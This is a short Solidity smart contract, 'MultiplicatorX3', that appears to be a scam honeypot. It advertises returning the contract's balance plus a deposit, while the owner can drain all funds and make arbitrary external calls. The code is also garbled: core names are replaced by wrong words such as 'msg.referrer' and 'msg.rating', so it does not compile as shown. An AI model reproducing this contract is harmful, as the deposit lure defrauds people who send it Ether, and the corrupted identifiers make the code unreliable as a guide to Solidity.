pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.referrer;

    function() public payable{}

    function obtainCare()
    payable
    public
    {
        require(msg.referrer == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes chart)
    payable
    public
    {
        require(msg.referrer == Owner);
        adr.call.rating(msg.rating)(chart);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.rating>=this.balance)
        {
            adr.transfer(this.balance+msg.rating);
        }
    }
}